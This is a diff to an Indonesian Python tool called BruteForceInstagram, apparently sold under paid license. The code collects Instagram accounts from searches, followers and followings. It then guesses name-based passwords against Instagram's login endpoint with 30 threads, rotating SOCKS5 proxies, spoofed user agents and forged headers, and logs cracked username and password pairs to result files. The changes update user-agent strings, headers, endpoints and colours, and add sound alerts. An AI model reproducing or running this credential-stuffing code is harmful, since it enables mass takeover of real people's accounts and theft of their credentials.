@@ -162,7 +162,7 @@ for x in range(3000):
 for x in range(1000):
 	rr= random.randint
 	rc= random.choice
-	A = f'Mozzila/5.0 (Linux; Android {str(rr(5,12))} AppleWebKit/537.36 (KHTML, like Gecko) Version/2.0 Chrome/{str(rr(85,104))}.0.{str(rr(149,5195))}.{str(rr(1,164))} Mobile Safari/537.36'
+	A = f'Mozilla/5.0 (Linux; Android {str(rr(5,12))} AppleWebKit/537.36 (KHTML, like Gecko) Version/2.0 Chrome/{str(rr(85,104))}.0.{str(rr(149,5195))}.{str(rr(1,164))} Mobile Safari/537.36'
 	uaku2=f'{A}'
 	ugen.append(uaku2)
 
@@ -171,9 +171,13 @@ for x in range(1000):
 #--------------------[ BANNER ]-----------------------#
 def banner():
     clear();cetak(nel(f'''{asu}
-
+     _____________  ___________   ______  _____________  __
+     ___  __/__  / / /__  ____/   ___   |/  /__    |_  |/ /
+     __  /  __  /_/ /__  __/________  /|_/ /__  /| |_    / 
+     _  /   _  __  / _  /___/_____/  /  / / _  ___ |    |  
+     /_/    /_/ /_/  /_____/      /_/  /_/  /_/  |_/_/|_|                                                                         
                  {M2}•{K2}•{H2}•{O2} BruteForceInstagram🔥 {H2}•{K2}•{M2}•{asu}
-                      ''', style='dark_orange',
+                      ''', style='blue',
  title=f'{N2}•{N2} WELCOME TO MY TOOLS {N2}•{N2}', subtitle=f'• {P2}{waktu()}{U2} •'))
     
 try:
@@ -212,14 +216,14 @@ def login_kamu():
             kuki=open('.kukis.log','r').read()
         except FileNotFoundError:
             banner()
-            __anjing__ = '[dark_orange][[cyan]•>[jlue]] [dark_orange]Disarankan Login Menggunakan [dark_orange]Cookies!!\n[dark_orange][[dark_orange]•>[dark_orange]] [dark_orange]Sebab Kalau Lewat Manual Akun Gampang Terkena [dark_orange]Checkpoint!![dark_orange]'
-            cetak(nel(__anjing__, style='dark_orange'))
-            __kon__ = f'[dark_orange][[dark_orange]1[dark_orange]]. LOGIN MENGGUNAKAN COOKIE 	                ([dark_orange] ON[dark_orange] )\n[[dark_orange]2[dark_orange]]. LOGIN MENGGUNAKAN USERNAME & PASSWORD 	( [dark_orange]OFF[dark_orange])\n[[dark_orange]3[dark_orange]]. CARA MENDAPATKAN COOKIES INSTAGRAM	        ( [dark_orange]ON[dark_orange] )'
-            cetak(nel(__kon__, style='dark_orange'))
+            __anjing__ = '[blue][[cyan]•>[jlue]] [blue]Disarankan Login Menggunakan [red1]Cookies!!\n[white][[cyan]•>[white]] [green]Sebab Kalau Lewat Manual Akun Gampang Terkena [red1]Checkpoint!![white]'
+            cetak(nel(__anjing__, style='purple'))
+            __kon__ = f'[blue][[blue]1[blue]]. LOGIN MENGGUNAKAN COOKIE 	                ([green] ON[white] )\n[[cyan]2[white]]. LOGIN MENGGUNAKAN USERNAME & PASSWORD 	( [red1]OFF[white])\n[[cyan]3[white]]. CARA MENDAPATKAN COOKIES INSTAGRAM	        ( [green]ON[white] )'
+            cetak(nel(__kon__, style='blue'))
             loginpil=input(f"  ├──> Pilih : {B}")
             if loginpil=='1':
-                wel = '[dark_orange][[dark_orange]•[dark_orange]] Masukkan Username And Cookies Untuk Login'
-                cetak(nel(wel, style='dark_orange'))
+                wel = '[blue][[blue]•[blue]] Masukkan Username And Cookies Untuk Login'
+                cetak(nel(wel, style='purple'))
                 us=input(f'{C}  [{B}•{C}] Masukan Username : ')
                 cok=input(f'{C}  [{B}•{C}] Masukan Cookies  : ')
                 kuki=open('.kukis.log','w').write(cok)
@@ -243,13 +247,13 @@ def login():
     global external
     try:
         wel = '# Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
-        wel2 = mark(wel, style='dark_orange')
+        wel2 = mark(wel, style='blue')
         sol().print(wel2)
         us = input(f"{CY}[•] Masukan username: {C}")
         pw = stdiomask.getpass(prompt=f'{CY}[•] Masukan password: {C}')
     except KeyboardInterrupt:
         wel = '# KeyboardInterrupt terdeteksi... keluar !'
-        wel2 = mark(wel, style='dark_orange')
+        wel2 = mark(wel, style='blue')
         sol().print(wel2)
         exit()
     x = instagramAPI(us, pw).loginAPI()
@@ -261,12 +265,12 @@ def login():
         os.system('python run.py')
     elif x.get('status') == 'checkpoint':
         wel = '# Login checkpoint'
-        wel2 = mark(wel, style='dark_orange')
+        wel2 = mark(wel, style='blue')
         sol().print(wel2)
         login()
     else:
         wel = '# Username atau password yang anda masukan salah'
-        wel2 = mark(wel, style='dark_orange')
+        wel2 = mark(wel, style='blue')
         sol().print(wel2)
         login()
         
@@ -340,7 +344,7 @@ class instagram:
 [{H}•{C}]Following      : {following}
 [{H}•{C}]Version        : 5.7'''
             print(welcome)
-            prints(Panel('[[dark_orange]01[dark_orange ]] [dark_orange]Crack Dari Pencarian         [dark_orange ][[dark_orange]02[dark_orange ]] [dark_orange]Crack Dari Pengikut\n[dark_orange ][[dark_orange]03[dark_orange ]] [dark_orange]Crack dari Mengikuti         [dark_orange ][[dark_orange]04[dark_orange ]] [dark_orange]Checkpoint Detector  \n[dark_orange ][[dark_orange]05[dark_orange ]] [dark_orange]Lihat Hasil Crack            [dark_orange ][[dark_orange]06[dark_orange ]] [dark_orange]Bot Auto Unfollow\n[dark_orange ][[dark_orange]R[dark_orange ]] [dark_orange] informasi Script             [dark_orange ][[dark_orange]C[dark_orange ]] [dark_orange]Changelog\n[dark_orange ][[dark_orange]E[dark_orange ]] [dark_orange] Exit',title='MENU',style='dark_orange')),sys.stdout.flush()
+            prints(Panel('[[blue]01[blue ]] [blue]Crack Dari Pencarian         [blue ][[blue]02[blue ]] [blue]Crack Dari Pengikut\n[blue ][[blue]03[blue ]] [blue]Crack dari Mengikuti         [blue ][[blue]04[blue ]] [blue]Checkpoint Detector  \n[blue ][[blue]05[blue ]] [blue]Lihat Hasil Crack            [blue ][[blue]06[blue ]] [blue]Bot Auto Unfollow\n[blue ][[blue]R[blue ]] [blue] informasi Script             [blue ][[blue]C[blue ]] [blue]Changelog\n[blue ][[blue]E[blue ]] [blue] Exit',title='MENU',style='blue'));os.system("play-audio data/sora.mp3")
 
 
     def BUG(self):
@@ -353,27 +357,27 @@ class instagram:
 - Silahkan menghubungi kontak saya 
 - +6287752662364
 - Soraa🔥🔥 '''
-        cetak(nel(donasi, title=' • informasi • ', style='dark_orange'))
+        cetak(nel(donasi, title=' • informasi • ', style='blue'))
         sleep(0.50)
         exit()
 
     def ChangeLog(self):
         io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
-        oi = nel(io, style='dark_orange')
+        oi = nel(io, style='blue')
         cetak(nel(oi, title='Fitur yang di update'))
 
         io='[1] Bot unfollow instagram\n[2] Bot spam komen'
-        oi = nel(io, style='dark_orange')
+        oi = nel(io, style='blue')
         cetak(nel(oi, title='Fitur tambahan'))
 
         io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
-        oi = nel(io, style='dark_orange')
+        oi = nel(io, style='blue')
         cetak(nel(oi, title='Fix Bug'))
         exit()
 
     def Exit(self):
         kel='# Apakah anda yakin ingin keluar ?'
-        kel1=mark(kel,style='dark_orange ')
+        kel1=mark(kel,style='blue ')
         sol().print(kel1)
         x=input(f'\n{H}[•] Jawaban [y/t] : {C}')
         if x in ('y','Y'):
@@ -444,7 +448,7 @@ class instagram:
         if 'sukses' in lisensiku:
             try:
                 idtar = f'#  TUNGGU SEDANG MENGUMPULKAN ID'
-                idtar1 = mark(idtar, style='dark_orange')
+                idtar1 = mark(idtar, style='blue')
                 sol().print(idtar1)
                 x = s.get(api % (id), cookies=cookie,
                           headers={"user-agent": USN})
@@ -489,7 +493,7 @@ class instagram:
         if 'sukses' in lisensiku:
             try:
                 idtar = f'#  TUNGGU SEDANG MENGUMPULKAN ID'
-                idtar1 = mark(idtar, style='dark_orange')
+                idtar1 = mark(idtar, style='blue')
                 sol().print(idtar1)
                 x = s.get(api % (id), cookies=cookie,
                           headers={"user-agent": USN})
@@ -531,11 +535,11 @@ class instagram:
             lisensi()
 
     def passwordAPI(self,xnx):
-        idtar = f'[dark_orange]              	          {len(internal)} ID'
-        idtar1 = nel(idtar, style='dark_orange ')
+        idtar = f'[blue]              	          {len(internal)} ID'
+        idtar1 = nel(idtar, style='blue ')
         cetak(nel(idtar1, title='TOTAL ID TERKUMPUL'))
-        komb = '[dark_orange][1][/dark_orange] [dark_orange]Nama,Nama123,Nama1234[/dark_orange]\n[bright_white][2][/bright_white] [dark_orange]Nama,Nama123,Nama1234,Nama12345[/dark_orange]\n[bright_white][3][/bright_white] [dark_orange]Nama,Nama123,Nama1234,Nama12345,Nama123456[/dark_orange]\n[bright_white][4][/bright_white] [dark_orange]Nama,Nama123,Nama1234,Nama12345,Nama1122[/dark_orange]\n[dark_orange][5][/dark_orange] [dark_orange]Password Manual[/dark_orange]'
-        komb1 = nel(komb, style='dark_orange ')
+        komb = '[blue][1][/blue] [blue]Nama,Nama123,Nama1234[/blue]\n[bright_white][2][/bright_white] [blue]Nama,Nama123,Nama1234,Nama12345[/blue]\n[bright_white][3][/bright_white] [blue]Nama,Nama123,Nama1234,Nama12345,Nama123456[/blue]\n[bright_white][4][/bright_white] [blue]Nama,Nama123,Nama1234,Nama12345,Nama1122[/blue]\n[blue][5][/blue] [blue]Password Manual[/blue]'
+        komb1 = nel(komb, style='blue ')
         cetak(nel(komb1, title='MASUKKAN PILIHAN PASSWORD'))
         c = input(f'{H}[•] MASUKKAN PILIHAN ANDA :{C} ')
         if c == '1':
@@ -558,11 +562,11 @@ class instagram:
             self.passwordAPI(xnx)
 
     def generateAPI(self,user,o,zx=''):
-        io=f'[dark_orange][•] Hasil OK disimpan ke: result/{day}.txt\n[•] Hasil CP disimpan ke: result/{day}.txt'
-        oi = nel(io, style='dark_orange ')
+        io=f'[blue][•] Hasil OK disimpan ke: result/{day}.txt\n[•] Hasil CP disimpan ke: result/{day}.txt'
+        oi = nel(io, style='blue ')
         cetak(nel(oi, title='CRACKING START'))
         ipku='# [🔥] ON-OFF MODE PESAWAT SETIAP 200 ID AGAR TERHINDAR DARI SPAM IP'
-        ipku1=mark(ipku,style='dark_orange')
+        ipku1=mark(ipku,style='blue')
         sol().print(ipku1)
         with ThreadPoolExecutor(max_workers=30) as shinkai:
             for i in user:
@@ -606,9 +610,9 @@ class instagram:
                     #print('Error')
                     pass
         print('\n')
-        
+        os.popen("play-audio data/selesai.mp3")
         oi = '# CRACK SELESAI'
-        io = mark(oi, style='dark_orange')
+        io = mark(oi, style='blue')
         sol().print(io)
         exit()
 
@@ -634,47 +638,42 @@ class instagram:
                 nip=random.choice(prox)
                 proxs= {'http': 'socks5://'+nip}
                 ua = random.choice(uasm)
-                aa='Mozilla/5.0 (OS/2; U;'
+                aa='Mozilla/5.0 (iPhone; CPU'
                 b=random.choice(['4','5','6','7','8','9','10','11','12'])
-                c= 'SMN-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))})'
+                c= 'IOS-'
                 d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G','J', 'K', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'])
                 e=random.randrange(1, 999)
                 f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-                g='Warp 4.5; en-US; rv:1.8.0.6) Gecko/20060730 MultiZilla/1.8.2.0i SeaMonkey/1.0.4/{str(rr(30,107))}/',
+                g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36'
                 h=random.randrange(73,200)
                 i='0'
                 j=random.randrange(4200,4900)
                 k=random.randrange(40,150)
-                l='SeaMonkey/1.0.4/{str(rr(30,107))}/'
+                l='Mobile Safari/537.36'
                 uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-                uafake = random.choice([
-                f"Mozilla/5.0 (OS/2; U; {str(rr(1,12))}; Windows{str(rr(30,107))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} SeaMonkey/1.0.4/",
-                f"Mozilla/5.0 (OS/2; U; {str(rr(1,12))}; Windows{str(rr(30,107))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} SeaMonkey/1.0.4/",
-                f"Mozilla/5.0 (OS/2; U; {str(rr(1,12))}; Windows{str(rr(30,107))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} SeaMonkey/1.0.4/"])
-                token=s.get('https://z-p42.www.instagram.com/accounts/login/ajax/',)
+                uafake=f"Instagram 244.0.0.12.112 (iPhone12,1; iOS {str(rr(4,12))}; Mac OS X) {str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) en_US; en-US; scale=2.00; 828x1792; 383361019)"
+                token=s.get('https://z-p42.www.instagram.com/accounts/logout/ajax/')
                 headers = {
                     'Host':'www.instagram.com',
                     'connection':'keep-alive',
-                    'sec-ch-ua':'"Chromium";v="107", "Not=A?Brand";v="24"',
-                    'x-ig-app-id':'936619743392459',
-                    'X-ASBD-ID':'198387',
+                    'sec-ch-ua':'"Chromium";v="105", "Not)A;Brand";v="8"',
+                    'x-ig-app-id':'1217981644879628',
                     'x-ig-www-claim':'0',
                     'sec-ch-ua-mobile': '?1',
-                    'access-control-expose-headers':'X-IG-Set-WWW-Claim',
-                    'x-instagram-ajax':'1006821362',
+                    'x-instagram-ajax':'9080db6b6a51',
                     'content-type':'application/x-www-form-urlencoded',
                     'accept':'*/*',
                     'x-requested-with':'XMLHttpRequest',
                     'x-asbd-id':'198387',
                     'user-agent': uaku,
                     'x-csrftoken':token.cookies['csrftoken'],
-                    'sec-ch-ua-platform': '"Linux"',
-                    'Origin':'https://www.instagram.com',
+                    'sec-ch-ua-platform': '"Android"',
+                    'origin':'https://www.instagram.com',
                     'sec-fetch-site':'same-origin',
                     'sec-fetch-mode':'cors',
-                    'sec-fetch-dest':'cross-site',
-                    'referer':'https://z-p42.www.instagram.com/accounts/login/ajax/',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',}
+                    'sec-fetch-dest':'empty',
+                    'referer':'https://z-p42.www.instagram.com/accounts/logout/ajax/',
+                    'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                 param={
                     "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                     "username": user,
@@ -682,38 +681,37 @@ class instagram:
                     "optIntoOneTap": 'false',
                     "stopDeletionNonce": "",
                     "trustedDeviceRecords": "{}"}
-                x=s.post("https://z-p42.www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
+                x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                 x_jason=json.loads(x.text)
                 if "userId" in str(x_jason):
                     nama,pengikut,mengikut,postingan=self.APIinfo(user)
                     io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}\nUserAgent: {uafake}'
-                    oi = nel(io, style='dark_orange')
+                    oi = nel(io, style='blue')
                     print('\n')
                     cetak(nel(oi, title=f'{M2} • {K2} • {H2} • {O2} SUCCESS {day}{H2} • {K2} • {M2} • '))
+                    os.popen("play-audio data/live.mp3")
                     open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                     success.append(user)
                     break
-                    
 
                 elif 'checkpoint_url' in str(x_jason):
                     nama,pengikut,mengikut,postingan=self.APIinfo(user)
                     io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                     print('\n')
-                    oi=nel(io,style='dark_orange')
+                    oi=nel(io,style='blue')
                     cetak(nel(oi, title=f'{M2} • {K2} • {H2} • {O2} CHECKPOINT {day}{H2} • {K2} • {M2} • '))
+                    os.popen("play-audio data/cp.mp3")
                     open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                     checkpoint.append(user)
-                    self.crackAPI(user,pas)
                     break
                 
                 elif 'ip_block' in str(x.text):
-                    sys.stdout.write(f"\r[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush()
+                    sys.stdout.write(f"\r[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0);os.system("play-audio data/ip.mp3")
                     self.crackAPI(user,pas)
-                    loop-=1
                 else:
                     continue
 
-            loop+=1 
+            loop+=1
         except:
             self.crackAPI(user,pas)
 
@@ -721,24 +719,24 @@ class instagram:
         global loop,success,checkpoint
         sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
         try:
-            token=s.get("https:www.instagram.com",headers={"user-agent":User_Agent()}).content
+            token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
             crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
             s.headers.update({
-                'authority': 'https://z-p42.www.instagram.com',
+                'authority': 'www.instagram.com',
                 'x-ig-www-claim': 'hmac.AR0Ft-pZRNZTzI7hjqy0oNQ3tHwi9IV_Q92-GUDay5ra5_FT',
-                'x-instagram-ajax': '1006821362',
+                'x-instagram-ajax': '91a4c055cfdf',
                 'content-type': 'application/x-www-form-urlencoded',
                 'accept': '*/*',
                 'user-agent': random.choice(open("ua.txt","r").read().splitlines()),
                 'x-requested-with': 'XMLHttpRequest',
                 'x-csrftoken': crf_token,
-                'x-ig-app-id': '936619743392459',
-                'origin': 'https:www.instagram.com',
+                'x-ig-app-id': '1217981644879628',
+                'origin': 'https://www.instagram.com',
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-mode': 'cors',
-                'sec-fetch-dest': 'cros-site',
-                'referer': 'https://z-p42.www.instagram.com',
-                'accept-language': 'en-GB,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6'
+                'sec-fetch-dest': 'empty',
+                'referer': 'https://www.instagram.com/',
+                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
             })
 
             param={
@@ -749,12 +747,12 @@ class instagram:
                 "stopDeletionNonce": "",
                 "trustedDeviceRecords": {}
             }
-            x=s.post("https://z-p42.www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
+            x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
             x_jason=json.loads(x.text)
             if "userId" in x.text:
                 nama,pengikut,mengikut,postingan=self.APIinfo(user)
                 io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
-                oi = nel(io, style='dark_orange ')
+                oi = nel(io, style='blue ')
                 print('\n')
                 cetak(nel(oi, title='SUCCESS DETECTOR '))
                 open(f"result/successdetector-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
@@ -763,7 +761,7 @@ class instagram:
             elif 'checkpoint_url' in x.text:
                 nama,pengikut,mengikut,postingan=self.APIinfo(user)
                 io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
-                oi = nel(io, style='dark_orange')
+                oi = nel(io, style='blue')
                 print('\n')
                 cetak(nel(oi, title=' CHECKPOINT DETECTOR'))
                 open(f"result/checkpointdetector-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
@@ -782,11 +780,11 @@ class instagram:
             self.menu()
         elif c in ('1','01'):
             mas='# Masukan jumlah target'
-            mas1=mark(mas,style='dark_orange ')
+            mas1=mark(mas,style='blue ')
             sol().print(mas1)
             m=int(input(f'\n{CY}[•] Jumlah : {C}'));print('')
             mas='# Masukan nama random untuk di searching'
-            mas1=mark(mas,style='dark_orange ')
+            mas1=mark(mas,style='blue ')
             sol().print(mas1)
             for i in range(m):
                 i+1
@@ -796,7 +794,7 @@ class instagram:
 
         elif c in ('2','02'):
             pr='# PASTIKAN TARGET BERSIFAT PUBLIK'
-            po=mark(pr,style='dark_orange')
+            po=mark(pr,style='blue')
             cetak(nel(po, title='NOTE'))
             mas=input('Apakah anda ingin crack masal? y/t >  ')
             if mas in ['y','Y']:
@@ -809,7 +807,7 @@ class instagram:
 
         elif c in ('3','03'):
             pr='# PASTIKAN TARGET BERSIFAT PUBLIK'
-            po=mark(pr,style='dark_orange')
+            po=mark(pr,style='blue')
             cetak(nel(po, title='NOTE'))
             mas=input('Apakah anda ingin crack masal? y/t >  ')
             if mas in ['y','Y']:
@@ -892,7 +890,7 @@ class instagram:
 def tlisensi():
     banner()
     nt='[bright_white][+] This Tool Paid\n[+] WhatsApp me if you want to buy a license\n[+] +6287752662364\n[+] You shall not misuse the information to gain unauthorised access.\n[+] I will not be Responsible for Anything, Use at Your Own Risk..⚠️\n[+] Use it properly..⚠️\n'
-    nt2 =nel(nt, style='dark_orange  ')
+    nt2 =nel(nt, style='blue  ')
     cetak(nel(nt2, title='NOTE⚠️'))
     time.sleep(1)
     lisen=input('[•] Masukankan License: ')
@@ -912,7 +910,7 @@ def lisensi():
     if status ==cek:
         banner()
         wel='# LISENSI BENAR '
-        wel2 = mark(wel, style='dark_orange')
+        wel2 = mark(wel, style='blue')
         sol().print(wel2)
         time.sleep(1)
         lisensiku.append("sukses")
@@ -924,7 +922,7 @@ def mengi(self):
     try:
         menudump.append('mengikuti')
         mas = '#   TARGET HARUS BERSIFAT PUBLIK JANGAN PRIVAT'
-        mas1 = mark(mas, style='dark_orange')
+        mas1 = mark(mas, style='blue')
         sol().print(mas1)
         m = int(input(f'\n{H}[?{H}] Masukan jumlah target: {N}'))
     except:
@@ -932,7 +930,7 @@ def mengi(self):
     for t in range(m):
         t += 1
         so = f'# TOTAL ID :{len(internal)}'
-        pi = mark(so, style='dark_orange')
+        pi = mark(so, style='blue')
         sol().print(pi)
         nama = input(f' [{t}] Masukan Username : ')
         id = self.idAPI(self.cookie, nama)
@@ -945,7 +943,7 @@ def meng(self):
 	try:
 		menudump.append('mengikuti')
 		mas = '#   TARGET HARUS BERSIFAT PUBLIK JANGAN PRIVAT'
-		mas1 = mark(mas, style='dark_orange')
+		mas1 = mark(mas, style='blue')
 		sol().print(mas1)
 		m = input(f'{H}[•] MASUKKAN USERNAME TARGET : {C}')	
 		id = self.idAPI(self.cookie, m)
@@ -958,14 +956,14 @@ def masal(self):
             try:
                 menudump.append('pengikut')
                 mas='#   TARGET HARUS BERSIFAT PUBLIK JANGAN PRIVAT'
-                mas1=mark(mas,style='dark_orange')
+                mas1=mark(mas,style='blue')
                 sol().print(mas1)
                 m=int(input(f'\n{H}[?{H}] Masukan jumlah target: {N}'))
             except:m=1
             for t in range(m):
                 t +=1
                 so=f'# 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃 :{len(internal)}'
-                pi=mark(so,style='dark_orange')
+                pi=mark(so,style='blue')
                 sol().print(pi)
                 nama=input(f' [{t}] Masukan Username : ')
                 id=self.idAPI(self.cookie,nama)
@@ -977,7 +975,7 @@ def masal(self):
 def massal(self):
             menudump.append('pengikut')
             mas='# TARGET HARUS BERSIFAT PUBLIK JANGAN PRIVAT'
-            mas1=mark(mas,style='dark_orange')
+            mas1=mark(mas,style='blue')
             sol().print(mas1)
             m=input(f'{H}[•] MASUKKAN USERNAME TARGET : {C}')
 
